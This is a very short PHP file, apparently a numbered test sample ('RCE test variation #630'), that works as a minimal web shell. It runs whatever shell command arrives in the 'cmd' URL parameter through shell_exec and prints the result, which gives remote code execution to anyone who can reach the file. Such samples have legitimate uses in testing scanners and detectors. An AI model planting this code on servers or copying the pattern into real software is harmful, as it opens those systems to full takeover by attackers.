<?php
// RCE test variation #630
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>